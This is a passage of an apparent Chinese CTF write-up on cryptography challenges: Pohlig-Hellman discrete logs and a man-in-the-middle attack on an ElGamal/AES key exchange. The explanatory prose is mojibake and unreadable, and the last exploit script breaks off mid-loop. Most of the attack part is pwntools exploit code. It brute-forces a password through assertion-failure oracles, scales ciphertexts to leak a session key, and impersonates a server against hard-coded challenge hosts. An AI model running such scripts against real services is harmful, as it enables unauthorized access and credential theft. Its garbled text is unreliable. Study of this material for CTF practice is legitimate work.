é€’ç»™æˆ‘ä»¬ï¼Œç‚¹Pæ˜¯eå€çš„ç‚¹Gï¼Œå½“æˆ‘ä»¬ç»™æœåŠ¡å™¨æ­£ç¡®çš„eçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥å¾—åˆ°flag\nè¿™å…¶å®å°±æ˜¯ä¸€ä¸ªç¦»æ•£å¯¹æ•°é—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆå…³æ³¨æœåŠ¡å™¨çš„å‚æ•°ï¼ŒMyCurveæ‰€ä½¿ç”¨çš„pæ˜¯512æ¯”ç‰¹çš„ï¼Œè€ŒOTä¸­RSAçš„næ˜¯2048æ¯”ç‰¹çš„ï¼Œè¿™æ ·ç”Ÿæˆçš„ç‚¹çš„xå’Œyä¹˜èµ·æ¥ä¹Ÿæ²¡æœ‰nçš„å¤§ã€‚é‚£ä¹ˆå¯ä»¥å‚è€ƒ2020hackergameçš„\rä¸ç»æ„ä¼ è¾“ä¸­çš„æ”»å‡»æ–¹å¼æ¥åŒæ—¶è·å–ç‚¹çš„xå’Œyåæ ‡\nä¹‹åä¾¿æ˜¯å¦‚ä½•é€šè¿‡ç‚¹Gå’Œç‚¹Pæ¥è·å–eäº†ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°p-1æ˜¯å…‰æ»‘çš„\nsage: factor(p-1) 2^21 * 3^10 * 7^4 * 11 * 13^2 * 17 * 19 * 29 * 31 * 37 * 43^3 * 47 * 71 * 83 * 89 * 97 * 223 * 293 * 587 * 631 * 709 * 761 * 1327 * 1433 * 1733 * 1889 * 2503 * 3121 * 6043 * 6301 * 49523 * 98429 * 140683 * 205589 * 1277369 * 1635649 * 5062909 * 45698189 * 67111151 * 226584089 * 342469397 é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡\rPohlig-Hellman algorithmæ¥è§£å†³ç¦»æ•£å¯¹æ•°é—®é¢˜å¹¶æœ€ç»ˆå¾—åˆ°flag\nEXP # expæœ‰æ¦‚ç‡æˆåŠŸï¼Œå¦‚æœæŠ¥é”™æˆ–è€…ç­”æ¡ˆé”™è¯¯å¤šè·‘å‡ æ¬¡å³å¯\n#!/usr/bin/env python import string, gmpy2 from hashlib import sha256 from pwn import * context.log_level = \u0026#34;debug\u0026#34; dic = string.ascii_letters + string.digits def solvePow(prefix,h): for a1 in dic: for a2 in dic: for a3 in dic: for a4 in dic: x = a1 + a2 + a3 + a4 proof = x + prefix.decode(\u0026#34;utf-8\u0026#34;) _hexdigest = sha256(proof.encode()).hexdigest() if _hexdigest == h.decode(\u0026#34;utf-8\u0026#34;): return x def getData(): r.recvuntil(\u0026#34;n = \u0026#34;) n = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) r.recvuntil(\u0026#34;e = \u0026#34;) e = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) r.recvuntil(\u0026#34;x0 = \u0026#34;) x0 = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) r.recvuntil(\u0026#34;x1 = \u0026#34;) x1 = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) offset = 2 \u0026lt;\u0026lt; 1024 offset_e = int(pow(offset, e, n)) v = ((offset_e * x0 - x1) * gmpy2.invert(offset_e - 1, n)) % n r.sendlineafter(\u0026#34;v = \u0026#34;,str(v)) r.recvuntil(\u0026#34;m0_ = \u0026#34;) m0 = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) r.recvuntil(\u0026#34;m1_ = \u0026#34;) m1 = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) m = (m0 * offset - m1) % n x = m // offset + 1 y = x * offset - m return x,y r = remote(\u0026#34;47.100.50.252\u0026#34;,10000) r.recvuntil(\u0026#34;sha256(XXXX+\u0026#34;) prefix = r.recvuntil(\u0026#34;) == \u0026#34;, drop = True) h = r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True) result = solvePow(prefix,h) r.sendlineafter(\u0026#34;Give me XXXX: \\n\u0026#34;,result) r.recvuntil(\u0026#34;p = \u0026#34;) r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True) r.recvuntil(\u0026#34;D = \u0026#34;) D = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) Gx,Gy = getData() Px,Py = getData() with open(\u0026#34;data.txt\u0026#34;,\u0026#34;wb\u0026#34;) as f: f.write(str(D).encode() + b\u0026#34;\\n\u0026#34;) f.write(str(Gx).encode() + b\u0026#34;\\n\u0026#34;) f.write(str(Gy).encode() + b\u0026#34;\\n\u0026#34;) f.write(str(Px).encode() + b\u0026#34;\\n\u0026#34;) f.write(str(Py).encode() + b\u0026#34;\\n\u0026#34;) s = process(argv=[\u0026#34;sage\u0026#34;, \u0026#34;exp.sage\u0026#34;]) e = int(s.recv()) s.close() r.sendline(str(e)) r.interactive() # exp.sage load(\u0026#34;Curve.sage\u0026#34;) p = 9688074905643914060390149833064012354277254244638141162997888145741631958242340092013958501673928921327767591959476890238698855704376126231923819603296257 F = GF(p) fac = [2^21,3^10,7^4,11,13^2,17,19,29,31,37,43^3,47,71,83,89,97,223,293,587,631,709,761,1327,1433,1733,1889,2503,3121,6043,6301,49523,98429,140683,205589,1277369,1635649,5062909,45698189,67111151,226584089,342469397] def bsgs(g, y, p): m = int(ceil(sqrt(p - 1))) S = {} point = (u,0) for i in range(m): point = curve.add(point,g) pointg = point[0] \u0026lt;\u0026lt; 800 | point[1] S[pointg] = i gs = curve.mul(m,g) for i in range(m): pointy = y[0] \u0026lt;\u0026lt; 800 | y[1] if pointy in S: return S[pointy] - i * m + 1 y = curve.add(y,gs) return None def Pohlig_Hellman(G,P): ea = [] na = [] for i in range(len(fac)): c = fac[i] n = (p - 1) // c gi = curve.mul(n, G) yi = curve.mul(n, P) ei = bsgs(gi,yi,c) ea.append(ei%c) na.append(c) ee = crt(ea,na) return ee data = open(\u0026#34;data.txt\u0026#34;,\u0026#34;rb\u0026#34;).read().decode(\u0026#34;utf-8\u0026#34;) data = data.split(\u0026#34;\\n\u0026#34;) D = int(data[0]) Gx = int(data[1]) Gy = int(data[2]) Px = int(data[3]) Py = int(data[4]) G = (F(Gx),F(Gy)) P = (F(Px),F(Py)) u2 = (Gx ^ 2 - D * Gy ^ 2) u2 = F(u2) u = int(u2.sqrt()) curve = MyCurve(p , D , u) e = Pohlig_Hellman(G,P) e %= p - 1 print(e) AliceWantFlag # é¢˜ç›®åˆ†æ # è¿™é“é¢˜ç›®åˆ†ä¸ºserverç«¯å’ŒAliceç«¯ï¼Œå…¶ä¸­serverç«¯çš„ä»£ç å¦‚ä¸‹\nfrom elgamal import elgamal import socketserver from prikey import server_prikey , AlicePasswd from pubkey import Alice_pubkey from secret import Alice_flag , ctfer_flag import random import signal from os import urandom from Crypto.Util.number import long_to_bytes , bytes_to_long from Crypto.Cipher import AES MENU = \u0026#34;1. signup 2.signin\u0026#34; XOR = lambda s1,s2 :bytes([x1^x2 for x1 , x2 in zip(s1,s2)]) def pad(m): m += bytes([16 - len(m) % 16] * (16 - len(m) % 16)) return m def unpad(m): padlen = m[-1] for i in range(1 , padlen + 1): if m[-i] != m[-1]: return b\u0026#39;\u0026#39; return m[:-m[-1]] class server(socketserver.BaseRequestHandler): def setup(self): self.pubkey = {} self.passwd = {} self.prikey = elgamal(server_prikey) self.pubkey[b\u0026#39;Alice\u0026#39;] = elgamal(Alice_pubkey) self.passwd[b\u0026#39;Alice\u0026#39;] = AlicePasswd def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg , bytes): msg += b\u0026#39;\\n\u0026#39; else: msg += \u0026#39;\\n\u0026#39; msg = msg.encode() self.request.sendall(msg) def enc_send(self, msg , usrid , enc_key = b\u0026#39;\u0026#39;): if enc_key == b\u0026#39;\u0026#39;: pubenc = self.pubkey[usrid] y1 , y2 = pubenc.encrypt(bytes_to_long(msg)) self._send(str(y1) + \u0026#39;, \u0026#39; + str(y2)) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) self._send(aes.encrypt(pad(msg))) def dec_recv(self, enc_key = b\u0026#39;\u0026#39;): msg = self._recv() if enc_key == b\u0026#39;\u0026#39;: c = [int(i) for i in msg.split(b\u0026#39;, \u0026#39;)] m = self.prikey.decrypt(c) print(long_to_bytes(m)) return long_to_bytes(m) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) return unpad(aes.decrypt(msg)) def signup(self): if len(self.passwd) \u0026gt; 5: self._send(\u0026#39;sorry, the number of users is out of limit\u0026#39;) return 0 self._send(\u0026#39;please give me your name\u0026#39;) userid = self._recv() if len(userid) \u0026gt; 20: self._send(\u0026#39;your id can\\\u0026#39;t be too long\u0026#39;) return 0 elif userid in self.passwd: self._send(\u0026#39;the name has been used\u0026#39;) return 0 else: self._send(\u0026#39;please give me your passwd(encrypted)\u0026#39;) userpasswd = self.dec_recv() if len(userpasswd) \u0026gt; 11: self._send(\u0026#39;your password can\\\u0026#39;t be too long\u0026#39;) return 0 else: self.passwd[userid] = userpasswd self._send(\u0026#39;please give me your publickey\u0026#39;) userpubkey = self._recv() try: userpubkey = [int(i) for i in userpubkey[1:-1].split(\u0026#39;, \u0026#39;)] except: self._send(\u0026#39;publickey format error\u0026#39;) self.passwd.pop(userid) return 0 self.pubkey[userid] = elgamal(userpubkey) self._send(\u0026#39;sign up success\u0026#39;) return 1 def signin(self): self._send(\u0026#39;please give me your name\u0026#39;) userid = self._recv() if userid not in self.passwd: self._send(\u0026#39;sorry the userid is not existed\u0026#39;) return 0 while 1: random.seed(urandom(8)) r = random.getrandbits(8 * 11) self._send(\u0026#39;please give me your passwd(encrypted and xored by r)\u0026#39;) self._send(str(r)) userdata = self.dec_recv() if bytes_to_long(userdata) == r ^ bytes_to_long(self.passwd[userid]): self._send(\u0026#39;signin success\u0026#39;) break else: self._send(\u0026#39;password error\u0026#39;) endkey = urandom(5) key = userdata + endkey self._send(\u0026#39;now let\\\u0026#39;s communicate with this key\u0026#39;) self.enc_send(endkey , userid) return userid , key def handle(self): signal.alarm(240) key = b\u0026#39;\u0026#39; userid = \u0026#39;\u0026#39; while 1: self._send(MENU) choice = self._recv() if choice == b\u0026#39;1\u0026#39;: self.signup() elif choice == b\u0026#39;2\u0026#39;: temp = self.signin() if temp != 0: userid , key = temp break else: self._send(\u0026#39;error\u0026#39;) msg = self.dec_recv(enc_key = key) if msg == b\u0026#39;I am a ctfer.Please give me flag\u0026#39;: self.enc_send(b\u0026#39;ok, your flag is here \u0026#39; + ctfer_flag , userid , enc_key= key) elif msg == b\u0026#39;I am Alice, Please give me true flag\u0026#39; and userid == b\u0026#39;Alice\u0026#39;: self.enc_send(b\u0026#39;Hi Alice, your flag is \u0026#39; + Alice_flag , userid , enc_key= key) return 0 def finish(self): self.request.close() class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10001 server = ForkedServer((HOST, PORT), server) server.allow_reuse_address = True server.serve_forever() Aliceç«¯çš„ä»£ç å¦‚ä¸‹\nimport socket from elgamal import elgamal from pubkey import server_pubkey from prikey import Alice_prikey , AlicePasswd from Crypto.Util.number import long_to_bytes , bytes_to_long from Crypto.Cipher import AES import socketserver , signal def pad(m): m += bytes([16 - len(m) % 16] * (16 - len(m) % 16)) return m def unpad(m): return m[:-m[-1]] class Alice: def __init__(self , ip , port): self.pridec = elgamal(Alice_prikey) self.pubenc = elgamal(server_pubkey) self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.s.connect((ip, port)) def _recv(self): data = self.s.recv(1024) return data.strip() def _send(self, msg): if isinstance(msg , str): msg = msg.encode() self.s.send(msg) def enc_send(self, msg , enc_key = b\u0026#39;\u0026#39;): if enc_key == b\u0026#39;\u0026#39;: y1 , y2 = self.pubenc.encrypt(bytes_to_long(msg)) self._send(str(y1) + \u0026#39;, \u0026#39; + str(y2)) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) self._send(aes.encrypt(pad(msg))) def dec_recv(self, enc_key = b\u0026#39;\u0026#39;): msg = self._recv() if enc_key == b\u0026#39;\u0026#39;: c = [int(i) for i in msg.split(b\u0026#39;, \u0026#39;)] m = self.pridec.decrypt(c) return long_to_bytes(m) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) return unpad(aes.decrypt(msg)) def main(self): firstmsg = self._recv() if firstmsg != b\u0026#39;1. signup 2.signin\u0026#39;: return 0 self._send(\u0026#39;2\u0026#39;) self._recv() self._send(\u0026#39;Alice\u0026#39;) self._recv() r = int(self._recv()) userdata = long_to_bytes(bytes_to_long(AlicePasswd) ^ r) self.enc_send(userdata) self._recv() self._recv() endkey = self.dec_recv() key = userdata + endkey self.enc_send(b\u0026#39;I am a ctfer.Please give me flag\u0026#39; , enc_key = key) return self.dec_recv(enc_key = key) class Task(socketserver.BaseRequestHandler): def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg , bytes): msg += b\u0026#39;\\n\u0026#39; else: msg += \u0026#39;\\n\u0026#39; msg = msg.encode() self.request.sendall(msg) def handle(self): signal.alarm(60) self._send(\u0026#39;Hello, I am Alice, can you tell me the address of the server?\\nIn return, I will give you the ctf_flag\u0026#39;) try: addr = self._recv() ip, port = [x.strip() for x in addr.split(b\u0026#39;:\u0026#39;)] port = int(port) except: ip, port = \u0026#39;0.0.0.0\u0026#39;, 10001 a = Alice(ip , port) msg = a.main() self._send(b\u0026#39;Thanks, here is your flag\u0026#39;) self._send(msg) class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10003 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() serverå’ŒAliceçš„å¯†é’¥ç”Ÿæˆå’Œä½¿ç”¨éƒ½å’Œelgamalç®—æ³•ä¸€è‡´ï¼Œè¿™é‡Œä¸å†é˜è¿°\næœåŠ¡ç«¯çš„å¤§æ¦‚é€»è¾‘å¦‚ä¸‹\nU: User S: Server UserPasswd = UserPublicKey Sign Up: S -\u0026gt; U : \u0026#39;please give me your name\u0026#39; U -\u0026gt; S : userid S : assert len(userid) \u0026lt;= 20 and userid not in passwd S -\u0026gt; U : \u0026#39;please give me your passwd(encrypted)\u0026#39; U -\u0026gt; S : c = elgamal.enc(UserPasswd,ServerPublicKey) S : userpasswd = elgamal.dec(c,ServerPrivateKey S : assert len(userpasswd) \u0026lt;= 11 S : passwd[userid] = userpasswd S -\u0026gt; U : \u0026#39;sign up success\u0026#39; Sign In: S -\u0026gt; U : \u0026#39;please give me your name\u0026#39; U -\u0026gt; S : userid S : assert userid in passwd S -\u0026gt; U : \u0026#39;please give me your passwd(encrypted and xored by r)\u0026#39; S -\u0026gt; U : r = random.getrandbits(8 * 11) U -\u0026gt; S : c = elgamal.enc(UserPasswd ^ r,ServerPublicKey) S : assert elgamal.dec(c,ServerPrivateKey) == passwd[userid] ^ r S : key = userdata + endkey, userdata = passwd[userid] ^ r, endkey = urandom(5) S -\u0026gt; U : \u0026#39;now let\\\u0026#39;s communicate with this key\u0026#39; S -\u0026gt; U : k = elgamal.enc(key,UserPasswd) U -\u0026gt; S : m = AES.enc(key,msg) S : dm = AES.dec(key,m) S : if dm == \u0026#39;I am a ctfer.Please give me flag\u0026#39;: S -\u0026gt; U : r1 = AES.enc(key,ctfer_flag) S : if dm == \u0026#39;I am Alice, Please give me true flag\u0026#39; and userid == \u0026#39;Alice\u0026#39; S -\u0026gt; U : r2 = AES.enc(key,Alice_flag) å¤§æ¦‚ç†è§£ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªåˆ©ç”¨elgamalè¿›è¡Œå¯†é’¥äº¤æ¢ç„¶ååŠ å¯†é€šä¿¡çš„é€»è¾‘\nç”±äºè¿™é‡Œæˆ‘ä»¬éœ€è¦ä»¥Aliceçš„èº«ä»½ç™»é™†å¹¶ä½¿ç”¨äº¤æ¢çš„AESé€šä¿¡å¯†é’¥è¿›è¡Œå¯†æ–‡çš„åŠ å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦çŸ¥é“AlicePasswdå’Œkey\nè¿™é“é¢˜ç›®ä¸­ç”±äºä¹Ÿæœ‰Aliceç«¯çš„æœåŠ¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ªè£…æˆæœåŠ¡ç«¯æ¥å’ŒAliceç«¯è¿›è¡Œé€šä¿¡ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œä¸­é—´äººæ”»å‡»\né¦–å…ˆæ¥çœ‹çœ‹å¦‚ä½•è·å¾—AlicePasswdï¼Œè§‚å¯ŸAliceç«¯çš„å¦‚ä¸‹ä»£ç \ndef main(self): firstmsg = self._recv() if firstmsg != b\u0026#39;1. signup 2.signin\u0026#39;: return 0 self._send(\u0026#39;2\u0026#39;) self._recv() self._send(\u0026#39;Alice\u0026#39;) self._recv() r = int(self._recv()) userdata = long_to_bytes(bytes_to_long(AlicePasswd) ^ r) self.enc_send(userdata) self._recv() self._recv() endkey = self.dec_recv() key = userdata + endkey self.enc_send(b\u0026#39;I am a ctfer.Please give me flag\u0026#39; , enc_key = key) return self.dec_recv(enc_key = key) def dec_recv(self, enc_key = b\u0026#39;\u0026#39;): msg = self._recv() if enc_key == b\u0026#39;\u0026#39;: c = [int(i) for i in msg.split(b\u0026#39;, \u0026#39;)] m = self.pridec.decrypt(c) return long_to_bytes(m) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) return unpad(aes.decrypt(msg)) ç”±äºendkeyé•¿åº¦ä¸º5ï¼Œè€Œkeyçš„é•¿åº¦æ˜¯16ï¼Œé‚£ä¹ˆå¯ä»¥è‡ªç„¶æ¨æ–­å‡ºuserdataçš„é•¿åº¦ä¸º11\nä½†æ˜¯å¦‚æœæˆ‘ä»¬æ§åˆ¶rä½¿å¾—userdataçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¼‚æˆ–ä¸ºäº†\\x00ï¼Œé‚£ä¹ˆuserdataçš„é•¿åº¦å°±å˜æˆäº†10ï¼Œå¦‚æœendkeyçš„é•¿åº¦ä¸å˜ï¼Œå†ä½¿ç”¨userdata + endkeyä½œä¸ºAESçš„keyï¼Œé‚£ä¹ˆä¼šé€šä¸è¿‡assert len(enc_key) == 16ï¼Œå³è¿æ¥ä¼šæ–­å¼€\nè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡å•å­—èŠ‚çˆ†ç ´AlicePasswdçš„å€¼ä½¿å¾—keyçš„é•¿åº¦ä»16å˜æˆ15ï¼Œè¿™æ ·å°±èƒ½è·å¾—AlicePasswdçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åé‡å¤è¯¥è¿‡ç¨‹ä¾¿å¯ä»¥è·å¾—AlicePasswdï¼ˆæ¯çˆ†ç ´å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œåœ¨çˆ†ç ´ä¸‹ä¸€ä¸ªå­—èŠ‚çš„æ—¶å€™å°†endkeyçš„é•¿åº¦å˜é•¿ä¸€ä½å³å¯è¿ç»­çˆ†ç ´ï¼‰\nPSï¼šå®é™…ä¸Šçš„æ“ä½œè¿‡ç¨‹ä¸­AlicePasswdçš„æœ€åä¸€ä¸ªå­—èŠ‚çˆ†ç ´ä¸å‡ºæ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨æœåŠ¡ç«¯çš„Sign InåŠŸèƒ½æ¥çˆ†ç ´æœ€åä¸€ä¸ªå­—èŠ‚å³å¯\nåœ¨æ‹¿åˆ°äº†AlicePasswdä¹‹åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä¼ªé€ æˆAliceç™»é™†æœåŠ¡ç«¯ï¼Œä½†æ˜¯ç”±äºendkeyæ˜¯ä½¿ç”¨AlicePublicKeyæ¥è¿›è¡ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ‹¿åˆ°endkeyçš„å€¼æ‰èƒ½è·å¾—AESçš„keyå¹¶è¿›è¡Œä»»æ„æ–‡æœ¬åŠ è§£å¯†\nå‰é¢æˆ‘ä»¬æè¿‡ï¼Œendkeyé•¿åº¦ä¸º5ï¼Œä½†æ˜¯å®é™…ä¸Šelgamalçš„pæ˜¯512æ¯”ç‰¹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´endkeyè¿œæ¯”på°\nå¦‚æœæˆ‘ä»¬å°†elgamalåŠ å¯†åçš„endkeyçš„y2ä¹˜ä»¥ä¸€ä¸ªå€æ•°kï¼Œé‚£ä¹ˆelgamalè§£å¯†åçš„endkeyå°±ä¼šå˜å¤§kå€ï¼Œè¿™ä¸ªå€¼å¦‚æœç‰¹åˆ«å¤§ï¼Œåˆ™userdata + endkeyå°±ä¹Ÿä¼šå˜å¤§ï¼Œè¿™æ ·ä¾¿ä¼šé€šä¸è¿‡assert len(enc_key) == 16ï¼Œå³è¿æ¥ä¼šæ–­å¼€\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡éå†kå¹¶æŸ¥çœ‹è¿æ¥æ˜¯å¦æ–­å¼€æ¥å¾—åˆ°endkeyçš„å¤§è‡´èŒƒå›´ï¼Œç„¶åé€šè¿‡æ§åˆ¶rè®©userdataçš„é•¿åº¦å˜å°æ¥ä½¿å¾—æˆ‘ä»¬çš„kå¯ä»¥ä¸æ–­å˜å¤§ï¼Œè¿›è€Œå°†endkeyçš„å–å€¼èŒƒå›´ä¸æ–­ç¼©å°æ¥å¾—åˆ°endkey\næœ€åæˆ‘ä»¬ä¾¿å¯ä»¥è¿›è¡Œä»»æ„æ–‡æœ¬åŠ è§£å¯†æ¥è·å–flag\nEXP # çˆ†ç ´AlicePasswdçš„è„šæœ¬ï¼ˆé™¤äº†æœ€åä¸€ä¸ªå­—èŠ‚ï¼‰\n#!/usr/bin/env python from elgamal import elgamal from os import urandom from Crypto.Util.number import * from pwn import * from time import * import random #context.log_level = \u0026#39;debug\u0026#39; Alice_pubkey = (10701440058624032601015137538928332495339102166449611910023158626004456760436930147541475696463030881833656888220652983522600176918743749340172660134163173, 1564399668655593150166497641453625075939863931648697579307, 7485644640971189066076867813504769638089749022750276585841131549227880841063823940682209946365975810625990180843110530957715179877761206203179636693608929, 10399272689500457356753299445284422908920074489727610618928888372268024186959263604721857776550008093778901180936272708522371781846820901338928077050396521) pubenc = elgamal(Alice_pubkey) def enc(msg): y1 , y2 = pubenc.encrypt(bytes_to_long(msg)) return [y1,y2] def attackAlice(rr,m): try: middle_shell = listen(8888) alice_shell = remote(\u0026#34;47.100.0.15\u0026#34;,10003) alice_shell.recvuntil(b\u0026#34;Hello, I am Alice, can you tell me the address of the server?\\nIn return, I will give you the ctf_flag\\n\u0026#34;) alice_shell.sendline(\u0026#34;xxxx:8888\u0026#34;) # xxxx -\u0026gt; your vps\u0026#39;s ip middle_shell.sendline(b\u0026#39;1. signup 2.signin\u0026#39;) middle_shell.recv() middle_shell.sendline(b\u0026#39;please give me your name\u0026#39;) middle_shell.recv() middle_shell.sendline(b\u0026#39;please give me your passwd(encrypted and xored by r)\u0026#39;) middle_shell.sendline(str(rr)) middle_shell.recv() middle_shell.sendline(b\u0026#39;signin success\u0026#39;) middle_shell.sendline(b\u0026#39;now let\\\u0026#39;s communicate with this key\u0026#39;) middle_shell.sendline(str(m[0]) + \u0026#39;, \u0026#39; + str(m[1])) sleep(0.3) result = middle_shell.recv() if result != b\u0026#34;\u0026#34;: middle_shell.close() alice_shell.close() return True except: if middle_shell: middle_shell.close() if alice_shell: alice_shell.close() return False known_pwd = b\u0026#34;\u0026#34; # 0x35343764643163636333xx for i in range(11): for r in range(0,256): rr = ((bytes_to_long(known_pwd) \u0026lt;\u0026lt; 8) + r) \u0026lt;\u0026lt; ((11 - i - 1) * 8) print(\u0026#34;try:\u0026#34; + hex(rr)) msg = b\u0026#34;A\u0026#34; * (5 + i) c = enc(msg) if not attackAlice(rr,c): known_pwd += long_to_bytes(r) print(known_pwd.hex()) break çˆ†ç ´AlicePasswdçš„æœ€åä¸€ä¸ªå­—èŠ‚çš„è„šæœ¬\n#!/usr/bin/env python from elgamal import elgamal from os import urandom from Crypto.Util.number import * from pwn import * from time import * import random #context.log_level = \u0026#39;debug\u0026#39; dic = \u0026#34;0123456789abced\u0026#34; server_pubkey = (8299337325013713958100496214277076548352330213422739951900206795659160881192662528217175848727001874097369338994314737585158671248737646741717255122339339, 1168114014665994438995759247944846107956060291607878556427, 6500863983405565947154848535503122330952083500341721347265599161478330537510643776384164499549064061675517930495094496645911948535824156417648599603482256, 1567838365897620258270310904624368598290758028096181970817619626094906443214320401208038763050717813632540079799097716376430981907783174222429828480377116) pubenc = elgamal(server_pubkey) known_pwd = \u0026#34;547dd1ccc3\u0026#34; server_shell = remote(\u0026#34;47.100.0.15\u0026#34;,10001) server_shell.sendlineafter(\u0026#34;\\n\u0026#34;,\u0026#34;2\u0026#34;) server_shell.recvuntil(\u0026#34;please give me your name\\n\u0026#34;) server_shell.sendline(\u0026#34;Alice\u0026#34;) for c in dic: server_shell.recvuntil(\u0026#34;please give me your passwd(encrypted and xored by r)\\n\u0026#34;) rr = int(server_shell.recvline()) pwd = bytes_to_long((known_pwd + c).encode()) prefix = long_to_bytes(pwd ^ rr) assert(len(prefix) == 11) y1 , y2 = pubenc.encrypt(pwd ^ rr) server_shell.sendline(str(y1) + \u0026#39;, \u0026#39; + str(y2)) result = server_shell.recv() if b\u0026#34;success\u0026#34; in result: print(known_pwd + c) break server_shell.interactive() è·å–endkeyå¹¶è¿›è¡Œä¸­é—´äººæ”»å‡»çš„è„šæœ¬\n#!/usr/bin/env python from pwn import * from Crypto.Util.number import * from Crypto.Cipher import AES from elgamal import elgamal #context.log_level = \u0026#34;debug\u0026#34; pwd = \u0026#34;547dd1ccc38\u0026#34;.encode() pwd = bytes_to_long(pwd) server_pubkey = (8299337325013713958100496214277076548352330213422739951900206795659160881192662528217175848727001874097369338994314737585158671248737646741717255122339339, 1168114014665994438995759247944846107956060291607878556427, 6500863983405565947154848535503122330952083500341721347265599161478330537510643776384164499549064061675517930495094496645911948535824156417648599603482256, 1567838365897620258270310904624368598290758028096181970817619626094906443214320401208038763050717813632540079799097716376430981907783174222429828480377116) pubenc = elgamal(server_pubkey) p = 10701440058624032601015137538928332495339102166449611910023158626004456760436930147541475696463030881833656888220652983522600176918743749340172660134163173 def pad(m): m += bytes([16 - len(m) % 16] * (16 - len(m) % 16)) return m def unpad(m): padlen = m[-1] for i in range(1 , padlen + 1): if m[-i] != m[-1]: return b\u0026#39;\u0026#39; return m[:-m[-1]] def oracle(m,n,p): y1 = m[0] y2 = m[1] y2 = (y2 * n) % p return [y1,y2] def combineKey(m,rr): for i in range(3): sleep(0.3) try: middle_shell = listen(8888) alice_shell = remote(\u0026#34;47.100.0.15\u0026#34;,10003) alice_shell.recvuntil(b\u0026#34;Hello, I am Alice, can you tell me the address of the server?\\nIn return, I will give you the ctf_flag\\n\u0026#34;) alice_shell.sendline(\u0026#34;xxxx:8888\u0026#34;) # xxxx -\u0026gt; your vps\u0026#39;s ip middle_shell.sendline(b\u0026#39;1. signup 2.signin\u0026#39;) middle_shell.recv() middle_shell.sendline(b\u0026#39;please give me your name\u0026#39;) middle_shell.recv() middle_shell.sendline(b\u0026#39;please give me your passwd(encrypted and xored by r)\u0026#39;) middle_shell.sendline(str(rr)) middle_shell.recv() middle_shell.sendline(b\u0026#39;signin success\u0026#39;) middle_shell.sendline(b\u0026#39;now let\\\u0026#39;s communicate with this key\u0026#39;) middle_shell.sendline(str(m[0]) + \u0026#39;, \u0026#39; + str(m[1])) sleep(0.5) result = middle_shell.recv() print(result) if result != b\u0026#34;\u0026#34;: middle_shell.close() alice_shell.close() return True except: if middle_shell: middle_shell.close() if alice_shell: alice_shell.close() return False server_shell = remote(\u0026#34;47.100.0.15\u0026#34;,10001) server_shell.sendlineafter(\u0026#34;\\n\u0026#34;,\u0026#34;2\u0026#34;) server_shell.recvuntil(\u0026#34;please give me your name\\n\u0026#34;) server_shell.sendline(\u0026#34;Alice\u0026#34;) server_shell.recvuntil(\u0026#34;please give me your passwd(encrypted and xored by r)\\n\u0026#34;) rr = int(server_shell.recvline()) prefix = long_to_bytes(pwd ^ rr) assert(len(prefix) == 11) y1 , y2 = pubenc.encrypt(pwd ^ rr) server_shell.sendline(str(y1) + \u0026#39;, \u0026#39; + str(y2)) server_shell.recvuntil(\u0026#34;now let\u0026#39;s communicate with this key\\n\u0026#34;) y1,y2 = [int(i) for i in server_shell.recvuntil(\u0026#34;\\n\u0026#34;, drop = True).decode(\u0026#34;utf-8\u0026#34;).split(\u0026#34;, \u0026#34;)] print(y1,y2) success(\u0026#34;Get communicate key:\u0026#34; + str(y1) + \u0026#34;,\u0026#34; + str(y2)) l = 0 h = 2**40 idx = 0 prefix_length = 0 bound = 2**40 count = 0 flag = False for _ in range(11): if flag: break binary_ptr = 0x80 diff = binary_ptr // 2 assert_arr = [-1] * 256 for i in range(10): count += 1 if binary_ptr != 0 and assert_arr[binary_ptr-1] ^ assert_arr[binary_ptr] == 1: prefix_length += 1 l = bound // multiple h = bound // (multiple - 1) idx = multiple - 1 print(hex(l),hex(h),count) bound *= 0x100 if abs(h - l) \u0026lt; 2: flag = True break if binary_ptr != 255 and assert_arr[binary_ptr] ^ assert_arr[binary_ptr+1] == 1: prefix_length += 1 l = bound // (multiple + 1) 